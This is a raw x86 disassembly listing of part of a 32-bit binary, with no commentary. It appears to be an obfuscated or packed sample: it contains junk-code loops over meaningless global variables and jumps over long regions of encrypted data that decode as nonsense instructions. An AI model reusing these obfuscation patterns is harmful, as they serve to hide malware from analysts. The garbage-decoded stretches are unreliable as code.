  409423:	mov    DWORD PTR [esi+0x8],eax
  409426:	mov    DWORD PTR ds:0x412368,0x19
  409430:	cmp    DWORD PTR ds:0x412368,0x0
  409437:	je     0x409465
  40943d:	cmp    DWORD PTR ds:0x412368,0x21
  409444:	jne    0x409455
  40944a:	push   0x2b01
  40944f:	call   DWORD PTR ds:0x40d00c
  409455:	mov    eax,ds:0x412368
  40945a:	dec    eax
  40945b:	mov    ds:0x412368,eax
  409460:	jmp    0x409430
  409465:	mov    eax,DWORD PTR [ebp+0x18]
  409468:	mov    esi,DWORD PTR [ebp+0x10]
  40946b:	mov    DWORD PTR [esi+0xc],eax
  40946e:	mov    eax,DWORD PTR [ebp+0x1c]
  409471:	jmp    0x409522
  409476:	and    BYTE PTR [ebx],0x16
  409479:	xchg   esi,eax
  40947a:	xchg   ebp,eax
  40947b:	mov    ebx,0xa0863980
  409480:	xchg   ebp,eax
  409481:	xor    eax,0x303e79fc
  409486:	in     eax,0x20
  409488:	jle    0x409508
  40948a:	cmp    BYTE PTR [esi+0x7e],0x7e
  40948e:	fldenv [ebx-0x5e]
  409491:	jb     0x4094e4
  409493:	aad    0x3
  409495:	push   esi
  409496:	iret   
  409497:	xchg   WORD PTR [ecx-0xb],bx
  40949b:	push   cs
  40949c:	movnti DWORD PTR [edx+ecx*4+0x6472c02e],edi
  4094a4:	lea    eax,[ebp+0x50]
  4094a7:	stos   BYTE PTR es:[edi],al
  4094a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4094a9:	cmp    DWORD PTR [edi-0x4dbf661f],esi
  4094af:	mov    ebp,DWORD PTR [esi+0x6e]
  4094b2:	loop   0x409532
  4094b4:	lods   eax,DWORD PTR ds:[esi]
  4094b5:	bound  ebx,QWORD PTR [esp+eiz*2-0x1c]
  4094b9:	mov    DWORD PTR [eax+0x25b79efc],esp
  4094bf:	fmul   DWORD PTR [ebx]
  4094c1:	or     ebx,DWORD PTR [edx]
  4094c3:	push   ds
  4094c4:	stos   BYTE PTR es:[edi],al
  4094c5:	aad    0x8f
  4094c7:	ss sub eax,0x6e486401
  4094cd:	sub    ecx,DWORD PTR [edi+0x560e97e]
  4094d3:	rol    DWORD PTR [ecx],cl
  4094d5:	popa   
  4094d6:	pushf  
  4094d7:	jmp    0x1f9729dd
  4094dc:	ror    BYTE PTR [eax+0x2d],0x14
  4094e0:	dec    ebp
  4094e1:	mov    ebx,0xa75ad6fe
  4094e6:	mov    ds:0xe4e4c59d,al
  4094eb:	pop    esi
  4094ec:	in     al,dx
  4094ed:	jecxz  0x4094fd
  4094ef:	sbb    al,ch
  4094f1:	push   eax
  4094f2:	inc    edx
  4094f3:	sar    BYTE PTR [ecx-0x59],1
  4094f6:	int    0x10
  4094f8:	lods   eax,DWORD PTR ds:[esi]
  4094f9:	cmp    al,0x69
  4094fb:	jle    0x4094d7
  4094fd:	loop   0x409569
  4094ff:	leave  
  409500:	stc    
  409501:	fbld   TBYTE PTR cs:[eax-0x3e]
  409505:	and    DWORD PTR [eax+0x18ead6e0],0xffffff87
  40950c:	jle    0x40952e
  40950e:	cs xchg ebp,eax
  409510:	or     al,0x63
  409512:	ror    BYTE PTR [edx+0x5e],1
  409515:	xchg   edi,eax
  409516:	ja     0x409593
  409518:	add    dh,BYTE PTR [ebx+esi*4]
  40951b:	pop    ecx
  40951c:	les    esi,FWORD PTR [ecx-0x6fa8b78e]
  409522:	mov    esi,DWORD PTR [ebp+0x10]
  409525:	mov    DWORD PTR [esi+0x10],eax
  409528:	mov    eax,eax
  40952a:	mov    eax,DWORD PTR [ebp+0x8]
  40952d:	jmp    0x4095de
  409532:	es bnd jno 0x409580
  409536:	mov    ecx,0xcb626549
  40953b:	les    ebp,FWORD PTR [esi]
  40953d:	xor    ah,BYTE PTR [edx]
  40953f:	imul   BYTE PTR [ebp+0x7e21099c]
  409545:	jle    0x4094c9
  409547:	jle    0x4095c7
  409549:	jle    0x4094e2
  40954b:	sbb    ch,BYTE PTR [esi+0x57]
  40954e:	xlat   BYTE PTR ds:[ebx]
  40954f:	hlt    
  409550:	fidiv  DWORD PTR [ecx+0x72]
  409553:	jecxz  0x4095bc
  409555:	and    esi,edi
  409557:	pop    esi
  409558:	idiv   BYTE PTR [eax+0x25088709]
  40955e:	pop    es
  40955f:	test   al,0x5f
  409561:	dec    esp
  409562:	adc    BYTE PTR [ecx-0x12],cl
  409565:	jne    0x4094f4
  409567:	pop    es
  409568:	mov    DWORD PTR ds:0x3c421593,eax
  40956e:	or     ecx,DWORD PTR [eax+0x3a]
  409571:	dec    edx
  409572:	inc    ecx
  409573:	add    DWORD PTR [edi+0xa8e44c],ecx
  409579:	fimul  WORD PTR [esi]
  40957b:	pop    ecx
  40957c:	cmc    
  40957d:	dec    edi
  40957e:	mov    al,0x9e
  409580:	xchg   edx,eax
  409581:	sbb    al,0x59
  409583:	shl    al,1
  409585:	shl    DWORD PTR [esi],cl
  409587:	cmp    al,bh
  409589:	xchg   edi,eax
  40958a:	push   esp
  40958b:	xlat   BYTE PTR ds:[ebx]
  40958c:	icebp  
  40958d:	sub    al,0x85
  40958f:	addr16 stc 
  409591:	push   0x10734034
  409596:	iretw  
  409598:	pushf  
  409599:	(bad)  
  40959a:	sti    
  40959b:	or     al,0xfe
  40959d:	pop    edx
  40959e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40959f:	pushf  
  4095a0:	adc    cl,BYTE PTR [esi+0x6e]
  4095a3:	mov    ah,0x82
  4095a5:	scas   al,BYTE PTR es:[edi]
  4095a6:	jecxz  0x409626
  4095a8:	push   ss
  4095a9:	pop    esi
  4095aa:	inc    ecx
  4095ab:	dec    ebx
  4095ac:	cmpxchg DWORD PTR [edi+ebp*8+0x51],edi
  4095b1:	mov    dh,0xe5
  4095b3:	jge    0x409554
  4095b5:	xchg   ecx,eax
  4095b6:	sbb    al,BYTE PTR [edi]
  4095b8:	add    bh,ch
  4095ba:	leave  
  4095bb:	pop    ebx
  4095bc:	imul   ecx,edx,0x5911add8
  4095c2:	int3   
  4095c3:	pop    esi
  4095c4:	fstp   DWORD PTR [eax+0xfd6ab0b]
  4095ca:	stos   BYTE PTR es:[edi],al
  4095cb:	leave  
  4095cc:	out    0x88,al
  4095ce:	inc    esp
  4095cf:	ret    
  4095d0:	jns    0x409614
  4095d2:	daa    
  4095d3:	ss (bad) 
  4095d5:	sar    DWORD PTR [edi],1
  4095d7:	(bad)  
  4095d8:	(bad)
  4095db:	or     DWORD PTR [edi],ebp
  4095dd:	in     eax,0x33
  4095df:	rol    DWORD PTR [ebx],0xc2
  4095e2:	pop    esi
  4095e3:	leave  
  4095e4:	ret    0x18
  4095e7:	push   ebp
  4095e8:	mov    ebp,esp
  4095ea:	mov    eax,DWORD PTR [ebp+0xc]
  4095ed:	xor    edx,edx
  4095ef:	mov    ecx,0x7264fca0
  4095f4:	div    ecx
  4095f6:	mov    ecx,DWORD PTR [ebp+0x10]
  4095f9:	and    ecx,eax
  4095fb:	or     ecx,0x81161d8e
  409601:	mov    eax,ecx
  409603:	pop    ebp
  409604:	ret    0x18
  409607:	push   ebp
  409608:	mov    ebp,esp
  40960a:	jmp    0x40974f
  40960f:	test   eax,0x795cd0ce
  409614:	pusha  
  409615:	test   eax,0x818b5fdb
  40961a:	cmp    ebp,DWORD PTR [edi-0x55]
  40961d:	cli    
  40961e:	das    
  40961f:	popf   
  409620:	and    DWORD PTR [esi+0x7e],edi
  409623:	push   ss
  409624:	jg     0x4096a4
  409626:	jle    0x409666
  409628:	mov    ds:0xd06bd4e0,eax
  40962d:	mov    gs,WORD PTR [ebx]
  40962f:	(bad)  
  409630:	or     eax,0x11a57cb5
  409635:	hlt    
  409636:	gs shr ebx,1
  409639:	lahf   
  40963a:	dec    edi
  40963b:	lock dec esp
  40963d:	icebp  
  40963e:	xchg   esi,eax
  40963f:	or     DWORD PTR [ecx+0x73],edx
  409642:	sub    eax,DWORD PTR [eax-0x6b19b207]
  409648:	push   ds
  409649:	or     ebx,edi
  40964b:	jno    0x409607
  40964d:	mov    dl,0x0
  40964f:	and    dh,BYTE PTR [ecx+edx*2]
  409652:	test   BYTE PTR [esi+ebp*2+0x69],0xdd
  409657:	sbb    bl,BYTE PTR [ebx-0x38]
  40965a:	cmp    al,0x5c
  40965c:	push   ebx
  40965d:	sub    al,0xf5
  40965f:	(bad)  
  409660:	in     eax,dx
  409661:	enter  0xc387,0x90
  409665:	fst    DWORD PTR ds:0xcd6fef4e
  40966b:	(bad)  
  40966c:	sbb    ch,BYTE PTR [esi+0x2b]
  40966f:	pcmpgtd mm3,mm5
  409672:	ss mov edx,0xd608fa31
  409678:	inc    ebx
  409679:	(bad)  
  40967a:	jl     0x4096b4
  40967c:	call   0xddb7:0xe223a70e
  409683:	int    0x8f
  409685:	mov    bh,0xe6
  409687:	pop    ss
  409688:	jp     0x40960e
  40968a:	jb     0x409615
  40968c:	and    al,0xca
  40968e:	pop    esi
  40968f:	test   BYTE PTR [edi-0x67facf42],al
  409695:	(bad)
  409699:	jns    0x4096c0
  40969b:	cmp    DWORD PTR [edi-0x5870c262],edx
  4096a1:	xchg   ecx,eax
  4096a2:	sub    BYTE PTR [ebx-0x79],0xfd
  4096a6:	inc    edi
  4096a7:	and    DWORD PTR [edx-0x9ac9a8d],0xcaa30cf8
  4096b1:	leave  
  4096b2:	inc    edx
  4096b3:	xchg   DWORD PTR [esi+0x26],ecx
  4096b6:	stc    
  4096b7:	or     al,0x86
  4096b9:	enter  0x2b02,0xb4
  4096bd:	stos   BYTE PTR es:[edi],al
  4096be:	inc    edi
  4096bf:	or     eax,0xa2bbd55f
  4096c4:	mov    bl,dh
  4096c6:	and    eax,0x2a500e40
  4096cb:	in     al,0xe9
  4096cd:	aad    0x88
  4096cf:	adc    DWORD PTR [edx-0x27ad1c58],ebp
  4096d5:	retf   0x5968
  4096d8:	and    edi,DWORD PTR [edx-0x1d]
  4096db:	push   esp
  4096dc:	push   0x66
  4096de:	call   0xc7a6:0xc4ffa047
  4096e5:	dec    esp
  4096e6:	sbb    esp,ebp
  4096e8:	pop    ebx
  4096e9:	add    dl,BYTE PTR [ebx]
  4096eb:	cmp    BYTE PTR [edi],ah
  4096ed:	cli    
  4096ee:	xchg   edx,eax
  4096ef:	call   0xcfba:0xe22029ef
  4096f6:	adc    eax,0xd83197a4
  4096fb:	aam    0x6f
  4096fd:	mov    ds:0x47b8d20,al
  409702:	push   0x6dca7d06
  409707:	pop    ecx
  409708:	idiv   DWORD PTR [esi-0x162cfe4a]
  40970e:	cmp    al,0x6b
  409710:	pusha  
  409711:	jp     0x4096dd
  409713:	pop    ebx
  409714:	and    ebp,ecx
  409716:	add    ebp,esi
  409718:	xchg   edi,eax
  409719:	mov    al,ds:0x45ac7a9a
  40971e:	mov    edx,0xcae28ca1
  409723:	(bad)  
  409724:	push   esi
  409725:	mov    edx,DWORD PTR [edi+0x3c]
  409728:	test   eax,0x90bba624
  40972d:	iret   
  40972e:	(bad)  
  40972f:	adc    BYTE PTR [esi-0x1fac7d11],bh
  409735:	cwde   
  409736:	add    BYTE PTR [ebx+0x46],0x3f
  40973a:	push   esp
  40973b:	pop    ecx
  40973c:	das    
  40973d:	scas   eax,DWORD PTR es:[edi]
  40973e:	or     ebx,0x23
  409741:	inc    edi
  409742:	sub    edi,DWORD PTR [edx]
  409744:	cld    
  409745:	or     dh,ah
  409747:	or     ch,BYTE PTR [ebx+0xd918803]
  40974d:	dec    edi
  40974e:	or     edx,DWORD PTR [ecx+0x1b]
  409751:	rol    bh,1
  409753:	inc    ebp
  409754:	cld    
  409755:	cmp    al,0x85
  409757:	pushf  
  409758:	clc    
  409759:	or     DWORD PTR ds:0x4235bf,ebx
  40975f:	mov    eax,DWORD PTR [ebp-0x4]
  409762:	or     DWORD PTR ds:0x412370,0x19a1
  40976c:	mov    edx,DWORD PTR [ebp+0x10]
  40976f:	movzx  ecx,WORD PTR ds:0x41abd6
  409776:	adc    DWORD PTR ds:0x4235db,ecx
  40977c:	mov    ecx,0x7510859
  409781:	sub    DWORD PTR ds:0x417e59,0x412370
  40978b:	xor    eax,ecx
  40978d:	adc    DWORD PTR ds:0x41235c,0x41abd2
  409797:	add    eax,0x32729f
  40979c:	mov    DWORD PTR ds:0x415115,0x3ef2
  4097a6:	mov    DWORD PTR [edx],eax
  4097a8:	xor    edx,DWORD PTR ds:0x4235cb
  4097ae:	jmp    0x4098f3
  4097b3:	push   0xffffffe9
  4097b5:	xlat   BYTE PTR ds:[ebx]
  4097b6:	call   0xe006:0xf97b9855
  4097bd:	jl     0x4097c2
  4097bf:	aam    0xf4
  4097c1:	mov    al,ds:0x7e26b57f
  4097c6:	jle    0x4097de
  4097c8:	jg     0x409848
  4097ca:	jle    0x4097dd
  4097cc:	ss push ecx
  4097ce:	outs   dx,BYTE PTR ds:[esi]
  4097cf:	push   0x7f
  4097d1:	or     eax,0xdc13699b
  4097d6:	dec    ebx
  4097d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4097d8:	std    
  4097d9:	adc    eax,DWORD PTR [edi-0xe]
  4097dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4097dd:	mov    ds:0x85131983,eax
  4097e2:	scas   al,BYTE PTR es:[edi]
  4097e3:	jmp    0x73a3c842
  4097e8:	push   0x830498f6
  4097ed:	aaa    
  4097ee:	push   ebx
  4097ef:	sub    edi,DWORD PTR [edx+0x44d1fae3]
  4097f5:	fwait
  4097f6:	adc    esp,DWORD PTR [edi+0x0]
  4097f9:	cmc    
  4097fa:	mov    esi,0xc50efb4b
  4097ff:	imul   edx,ecx,0xffffff80
  409802:	sbb    DWORD PTR ds:0x1cfc2306,edx
  409808:	push   ds
  409809:	ror    cl,1
  40980b:	ss mov bl,0xb4
  40980e:	jae    0x4097d6
  409810:	mov    bl,BYTE PTR [ebp-0x31]
  409813:	aam    0xe1
  409815:	xchg   esi,eax
  409816:	pop    edi
  409817:	pop    edx
  409818:	mov    gs:0xd333c2b1,al
  40981e:	push   eax
  40981f:	add    cl,dl
  409821:	xchg   ebx,eax
  409822:	outs   dx,DWORD PTR ds:[esi]
  409823:	addr16 xor al,0x7b
  409826:	xor    eax,0x455aab6f
  40982b:	cvtps2pd xmm3,QWORD PTR [eax]
  40982e:	ja     0x4097d0
  409830:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409831:	jmp    0x8fb93878
  409836:	mov    edx,0x7471312f
  40983b:	pop    esp
  40983c:	xor    cl,bh
  40983e:	mov    al,ds:0xd009c463
  409843:	popf   
  409844:	mov    dh,0x24
  409846:	dec    ebx
  409847:	aaa    
  409848:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409849:	or     edi,DWORD PTR [ebx+0x2d2ae9b7]
  40984f:	push   ebx
  409850:	xor    DWORD PTR [edi-0x55],ebp
  409853:	jae    0x4098cb
  409855:	jmp    0x825fd411
  40985a:	inc    ebx
  40985b:	aas    
  40985c:	inc    esp
  40985d:	pop    eax
  40985e:	xor    DWORD PTR [esi],edx
  409860:	dec    ebx
  409861:	inc    esi
  409862:	sbb    eax,0x7f180ef6
  409867:	xchg   ebx,eax
  409868:	les    esp,FWORD PTR [ebx+0x14]
  40986b:	dec    ecx
  40986c:	sub    dh,BYTE PTR [eax]
  40986e:	int    0x1a
  409870:	sbb    BYTE PTR [edi],dh
  409872:	dec    ecx
  409873:	cli    
  409874:	nop
  409875:	mov    edi,0x17e7379d
  40987a:	aaa    
  40987b:	shl    BYTE PTR [ebp-0x7f],1
  40987e:	mov    DWORD PTR [ebx],ebx
  409880:	xchg   DWORD PTR [eax],esi
  409882:	loop   0x4098af
  409884:	fidiv  WORD PTR [esi+0x5b]
  409887:	mov    bl,BYTE PTR [ebx]
  409889:	xor    bl,BYTE PTR [edx]
  40988b:	jecxz  0x409884
  40988d:	jnp    0x4098e4
  40988f:	cmpps  xmm0,XMMWORD PTR [ebp+edi*4-0x79],0xa2
  409895:	pop    ds
  409896:	mov    edi,0x5dd788c5
  40989b:	and    eax,0xa331e6ee
  4098a0:	add    eax,0xac148e46
  4098a5:	jg     0x409908
  4098a7:	xor    BYTE PTR [edx],ah
  4098a9:	imul   esp,DWORD PTR [ebx],0xadae65bc
  4098af:	xor    al,BYTE PTR [edi]
  4098b1:	mov    esi,esi
  4098b3:	dec    esi
  4098b4:	mov    esi,0xe6e19f8f
  4098b9:	icebp  
  4098ba:	mov    esi,DWORD PTR [ebp+0xfcefdb2]
  4098c0:	sub    DWORD PTR [edx+0x1184633b],ebx
  4098c6:	icebp  
  4098c7:	add    ah,BYTE PTR [edx+edx*1]
  4098ca:	lds    edi,FWORD PTR ds:0x26886df3
  4098d0:	std    
  4098d1:	pushf  
  4098d2:	push   ecx
  4098d3:	imul   ebx,ebx,0xf9d4029a
  4098d9:	dec    edi
  4098da:	out    0x6b,al
  4098dc:	adc    ch,ch
  4098de:	fsub   st(4),st
  4098e0:	retf   
  4098e1:	inc    ecx
  4098e2:	data16 aas 
  4098e4:	sub    eax,DWORD PTR [edx+0x28]
  4098e7:	(bad)  
  4098e8:	call   0x39b4038e
  4098ed:	(bad)  
  4098ee:	retf   0x4983
  4098f1:	dec    ebx
  4098f2:	(bad)  
  4098f3:	mov    eax,DWORD PTR [ebp+0x14]
  4098f6:	and    DWORD PTR ds:0x412364,0x0
  409900:	mov    edx,DWORD PTR ds:0x412364
  409906:	inc    edx
  409907:	mov    DWORD PTR ds:0x412364,edx
  40990d:	cmp    DWORD PTR ds:0x412364,0x9
  409914:	jne    0x409930
  40991a:	push   DWORD PTR [ebp-0x14]
  40991d:	push   0x1e75
  409922:	push   0x8bb6
  409927:	push   DWORD PTR [ebp-0x18]
  40992a:	call   DWORD PTR ds:0x40d1f0
  409930:	cmp    DWORD PTR ds:0x412364,0x8
  409937:	jne    0x40994a
  40993d:	mov    edx,DWORD PTR ds:0x412364
  409943:	inc    edx
  409944:	mov    DWORD PTR ds:0x412364,edx
  40994a:	cmp    DWORD PTR ds:0x412364,0x1c
  409951:	jb     0x409900
  409957:	mov    edx,DWORD PTR [ebp+0x10]
  40995a:	mov    DWORD PTR [edx+0x4],eax
  40995d:	mov    eax,DWORD PTR [ebp+0x18]
  409960:	mov    edx,DWORD PTR [ebp+0x10]
  409963:	jmp    0x409aa8
  409968:	add    al,0x3c
  40996a:	cmp    bl,BYTE PTR [ebp-0x6]
  40996d:	jns    0x4099c8
  40996f:	gs push edi
  409971:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409972:	or     eax,0x63db54c
  409977:	mov    ds:0x7e7e276d,al
  40997c:	push   ss
  40997d:	jg     0x4099fd
  40997f:	jle    0x409983
  409981:	stos   DWORD PTR es:[edi],eax
  409982:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409983:	inc    ebx
  409984:	out    dx,eax
  409985:	ret    0xc6db
  409988:	fld    QWORD PTR [ebx-0x497b20ae]
  40998e:	adc    al,0x41
  409990:	and    eax,0xbe35663
  409995:	push   ebx
  409996:	hlt    
  409997:	ins    BYTE PTR es:[edi],dx
  409998:	ss jb  0x409941
  40999b:	mov    cl,0xc7
  40999d:	ds and al,0x6
  4099a0:	jmp    0x37df026e
  4099a5:	add    esi,esp
  4099a7:	in     eax,dx
  4099a8:	cs std 
  4099aa:	or     esi,ebp
  4099ac:	rcl    DWORD PTR [edi-0x41],0xa1
  4099b0:	into   
  4099b1:	pop    edx
  4099b2:	sub    al,0x0
  4099b4:	mov    eax,DWORD PTR [edx]
  4099b6:	xor    ecx,0xc580fa32
  4099bc:	add    DWORD PTR [eax],ecx
  4099be:	aad    0xe1
  4099c0:	es ins DWORD PTR es:[edi],dx
  4099c2:	jbe    0x4099a9
  4099c4:	icebp  
  4099c5:	loope  0x4099e6
  4099c7:	aaa    
  4099c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4099c9:	sar    edi,cl
  4099cb:	test   al,0xc6
  4099cd:	jns    0x4099e9
  4099cf:	sbb    DWORD PTR [edi],ecx
  4099d1:	dec    ecx
  4099d2:	mov    bl,0x40
  4099d4:	cmp    eax,0xe0bcdb26
  4099d9:	push   esp
  4099da:	xor    DWORD PTR [eax],ebx
  4099dc:	push   eax
  4099dd:	cmp    ah,BYTE PTR [ecx+0x21c561fc]
  4099e3:	cmp    BYTE PTR [ecx+0x53],0xb3
  4099e7:	mov    dl,BYTE PTR [esi]
  4099e9:	std    
  4099ea:	clc    
  4099eb:	lahf   
  4099ec:	pop    ds
  4099ed:	lds    esi,FWORD PTR [edi-0x15]
  4099f0:	stos   BYTE PTR es:[edi],al
  4099f1:	ret    
  4099f2:	cs enter 0x7052,0x6e
  4099f7:	and    al,BYTE PTR [edx+edx*1+0x37]
  4099fb:	pop    esi
  4099fc:	loopne 0x409992
  4099fe:	ins    BYTE PTR es:[edi],dx
  4099ff:	mov    al,ds:0x7e7ddf61
  409a04:	or     edx,DWORD PTR [eax+0x7d654296]
  409a0a:	leave  
  409a0b:	(bad)  
  409a0d:	cmp    bl,BYTE PTR [ebp+0x6d]
  409a10:	mov    bh,0x23
  409a12:	retf   0xcb67
  409a15:	and    dl,BYTE PTR [ebp+0x15cd7687]
  409a1b:	mov    ch,0xfe
  409a1d:	lgdtd  [ebx]
  409a20:	jo     0x409a48
  409a22:	mov    bh,0x52
  409a24:	sbb    bh,0x10
  409a27:	add    eax,0xe10a8caa
  409a2c:	je     0x409a6d
  409a2e:	int    0x7
  409a30:	and    BYTE PTR [esi-0x25],cl
  409a33:	jb     0x409a1d
  409a35:	dec    ebx
  409a36:	cmp    eax,0xffde40b0
  409a3b:	out    dx,eax
  409a3c:	push   ecx
  409a3d:	mov    dh,0x63
  409a3f:	xchg   DWORD PTR [ecx-0x78],ebx
  409a42:	mov    ds:0x14fe6363,eax
  409a47:	jecxz  0x409a0f
  409a49:	repz pop ecx
  409a4b:	imul   edi,DWORD PTR [ecx],0xedb5a63a
  409a51:	xor    BYTE PTR [ecx+0x48710cca],ah
  409a57:	mov    ch,0xb5
  409a59:	xchg   ebx,eax
  409a5a:	inc    edi
  409a5b:	(bad)  
  409a5d:	je     0x409a05
  409a5f:	mov    bh,0x9a
  409a61:	pop    ecx
  409a62:	(bad)  
  409a63:	ss pop edi
  409a65:	push   0x3f
  409a67:	xor    DWORD PTR [ecx-0x7],0xbd121ced
  409a6e:	inc    ecx
  409a6f:	cmc    
  409a70:	mov    ch,0xb7
  409a72:	xor    BYTE PTR [edi-0x1aaff8a6],bl
  409a78:	pop    edi
  409a79:	xor    ebp,edx
  409a7b:	adc    ch,ah
  409a7d:	xchg   ecx,eax
  409a7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a7f:	call   0x94ac2ab
  409a84:	jecxz  0x409a65
  409a86:	sbb    eax,esp
  409a88:	mov    esi,0x641d765f
  409a8d:	es jmp 0x409a10
  409a90:	sub    ch,BYTE PTR [edx]
  409a92:	mov    ds:0x17ae789,eax
  409a97:	aaa    
  409a98:	int3   
  409a99:	and    DWORD PTR [edx+0x6],ebx
  409a9c:	adc    eax,0xa341bb59
  409aa1:	xlat   BYTE PTR ds:[ebx]
  409aa2:	mov    cl,0xcd
  409aa4:	pop    ecx
  409aa5:	or     eax,0x42899f19
  409aaa:	or     BYTE PTR [ebx+0x558b1c45],cl
  409ab0:	adc    BYTE PTR [ecx+0x458b0c42],cl
  409ab6:	and    BYTE PTR [ebx+0x42891055],cl
  409abc:	adc    BYTE PTR [ebx+0x14458bc0],cl
  409ac2:	test   eax,eax
  409ac4:	mov    eax,DWORD PTR [ebp+0x8]
  409ac7:	jne    0x409ad0
  409acd:	mov    eax,DWORD PTR [ebp+0xc]
  409ad0:	xor    eax,ecx
  409ad2:	add    eax,0x32729f
  409ad7:	leave  
  409ad8:	ret    0x1c
  409adb:	push   ebp
  409adc:	mov    ebp,esp
  409ade:	sub    esp,0x74
  409ae1:	or     DWORD PTR ds:0x417e4d,0x412378
  409aeb:	push   ebx
  409aec:	inc    DWORD PTR ds:0x4235c7
  409af2:	push   esi
  409af3:	mov    esi,0x876987
  409af8:	sub    DWORD PTR ds:0x415111,0x412368
  409b02:	push   esi
  409b03:	push   0x40d6e4
  409b08:	xor    ebx,ebx
  409b0a:	adc    DWORD PTR ds:0x415115,0xb4e
  409b14:	push   0x40d70c
  409b19:	adc    DWORD PTR ds:0x412378,0x417e41
  409b23:	mov    DWORD PTR [ebp-0x4],ebx
  409b26:	xor    DWORD PTR ds:0x4235d3,0x95a
  409b30:	call   DWORD PTR ds:0x40d26c
  409b36:	cmp    eax,esi
  409b38:	je     0x409b45
  409b3e:	xor    eax,eax
  409b40:	jmp    0x40a5d1
  409b45:	push   edi
  409b46:	mov    edi,0x8e152d83
  409b4b:	mov    esi,0x60672eb0
  409b50:	push   0xa
  409b52:	adc    DWORD PTR ds:0x415119,0x51b8
  409b5c:	push   0xa
  409b5e:	and    DWORD PTR ds:0x412378,0x132f
  409b68:	push   0x1
  409b6a:	and    DWORD PTR ds:0x415101,0x415109
  409b74:	lea    eax,[ebp-0x4]
  409b77:	mov    DWORD PTR [ebp-0xc],eax
  409b7a:	and    DWORD PTR ds:0x4235d3,0x2ba
  409b84:	push   0x1
  409b86:	neg    DWORD PTR ds:0x417e41
  409b8c:	call   DWORD PTR ds:0x40d3cc
  409b92:	adc    DWORD PTR ds:0x412354,0x4235c3
  409b9c:	mov    DWORD PTR [ebp-0x8],eax
  409b9f:	mov    eax,DWORD PTR [ebp-0x8]
  409ba2:	test   eax,eax
  409ba4:	mov    DWORD PTR ds:0x412354,0x291c
  409bae:	je     0x40a327
  409bb4:	not    DWORD PTR ds:0x41abda
  409bba:	push   DWORD PTR [ebp-0x8]
  409bbd:	adc    DWORD PTR ds:0x4235d3,0x417e4d
  409bc7:	call   DWORD PTR ds:0x40d380
  409bcd:	add    DWORD PTR [ebp-0x4],0x2450a8e
  409bd4:	and    DWORD PTR ds:0x41abca,0x0
  409bde:	jmp    0x409bf0
  409be3:	mov    ecx,DWORD PTR ds:0x41abca
  409be9:	inc    ecx
  409bea:	mov    DWORD PTR ds:0x41abca,ecx
  409bf0:	cmp    DWORD PTR ds:0x41abca,0x16
  409bf7:	jae    0x409c20
  409bfd:	cmp    DWORD PTR ds:0x41abca,0x17
  409c04:	jne    0x409c1b
  409c0a:	push   DWORD PTR [ebp-0x18]
  409c0d:	push   DWORD PTR [ebp-0x20]
  409c10:	push   0x42f9
  409c15:	call   DWORD PTR ds:0x40d1f4
  409c1b:	jmp    0x409be3
  409c20:	xor    eax,eax
  409c22:	shl    DWORD PTR [ebp-0x4],1
  409c25:	and    DWORD PTR [ebp-0x4],edi
  409c28:	inc    edx
  409c29:	mov    ecx,DWORD PTR [ebp-0x4]
  409c2c:	imul   ecx,ecx,0x7f659e30
  409c32:	mov    DWORD PTR ds:0x412370,0x1a
  409c3c:	cmp    DWORD PTR ds:0x412370,0x0
  409c43:	je     0x409c7d
  409c49:	cmp    DWORD PTR ds:0x412370,0x26
  409c50:	jne    0x409c6b
  409c56:	push   0x66cd
  409c5b:	push   0x41abe2
  409c60:	push   0x5989
  409c65:	call   DWORD PTR ds:0x40d1f8
  409c6b:	mov    edx,DWORD PTR ds:0x412370
  409c71:	dec    edx
  409c72:	mov    DWORD PTR ds:0x412370,edx
  409c78:	jmp    0x409c3c
  409c7d:	mov    DWORD PTR [ebp-0x4],ecx
  409c80:	add    DWORD PTR ds:0x4235c3,ebx
  409c86:	or     DWORD PTR [ebp-0x4],esi
  409c89:	mov    ecx,DWORD PTR [ebp-0x4]
  409c8c:	mov    DWORD PTR ds:0x415119,0xfe3
  409c96:	mov    edx,DWORD PTR [ebp-0xc]
  409c99:	cmp    ecx,DWORD PTR [edx]
  409c9b:	mov    DWORD PTR ds:0x412364,0x44d1
  409ca5:	jne    0x40a327
  409cab:	mov    DWORD PTR ds:0x41510d,0x22b0
  409cb5:	inc    eax
  409cb6:	mov    DWORD PTR ds:0x41abda,0x2c7f
  409cc0:	cmp    eax,0x4
  409cc3:	jb     0x409c22
  409cc9:	and    DWORD PTR ds:0x415105,0x41abe2
  409cd3:	push   0x40d738
  409cd8:	sub    DWORD PTR ds:0x412374,0x2332
  409ce2:	call   DWORD PTR ds:0x40d3c4
  409ce8:	mov    DWORD PTR ds:0x415101,0x11
  409cf2:	cmp    DWORD PTR ds:0x415101,0x0
  409cf9:	je     0x409d41
  409cff:	cmp    DWORD PTR ds:0x415101,0x8
  409d06:	jne    0x409d15
  409d0c:	push   DWORD PTR [ebp-0x20]
  409d0f:	call   DWORD PTR ds:0x40d2a4
  409d15:	cmp    DWORD PTR ds:0x415101,0x9
  409d1c:	jne    0x409d2f
  409d22:	mov    ecx,DWORD PTR ds:0x415101
  409d28:	dec    ecx
  409d29:	mov    DWORD PTR ds:0x415101,ecx
  409d2f:	mov    ecx,DWORD PTR ds:0x415101
  409d35:	dec    ecx
  409d36:	mov    DWORD PTR ds:0x415101,ecx
  409d3c:	jmp    0x409cf2
  409d41:	xor    eax,eax
  409d43:	shl    DWORD PTR [ebp-0x4],1
  409d46:	mov    DWORD PTR ds:0x41abd6,0x12
  409d50:	cmp    DWORD PTR ds:0x41abd6,0x0
  409d57:	je     0x409da1
  409d5d:	cmp    DWORD PTR ds:0x41abd6,0x3
  409d64:	jne    0x409d75
  409d6a:	push   0x41ad52
  409d6f:	call   DWORD PTR ds:0x40d1fc
  409d75:	cmp    DWORD PTR ds:0x41abd6,0x4
  409d7c:	jne    0x409d8f
  409d82:	mov    edx,DWORD PTR ds:0x41abd6
  409d88:	dec    edx
  409d89:	mov    DWORD PTR ds:0x41abd6,edx
